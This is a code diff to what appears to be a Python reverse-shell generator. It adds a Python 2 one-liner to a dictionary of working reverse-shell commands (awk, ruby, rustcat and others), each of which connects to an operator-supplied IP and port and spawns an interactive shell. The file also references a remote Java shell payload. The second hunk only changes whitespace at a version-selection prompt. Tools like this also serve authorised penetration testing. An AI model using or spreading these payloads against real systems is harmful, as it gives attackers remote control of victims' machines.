@@ -74,6 +74,7 @@ url3 = "https://github.com/ElMehdi-Chbani/Reverse-Shells/raw/main/shell.java"
 
 # Define a dictionary for different shell commands
 shell_commands = {
+    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
     "awk": 'awk \'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (IP, PORT),
     "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\'' % (IP, PORT),
     "rustcat": "rcat {} {} -r undefined".format(IP, PORT),
@@ -153,7 +154,7 @@ elif EXTENSION == "python":
     print("  ~) -"+color(" Python         ",(CYAN))+"  ~) - "+color("Python2",(CYAN)))
     print("  ~) -"+color(" Python3         ",(CYAN)))
     print("\n")
-
+    
     EX = prompt("What Python Version are you using: ", completer=completer2).lower()
     EXTENSION = EX
 
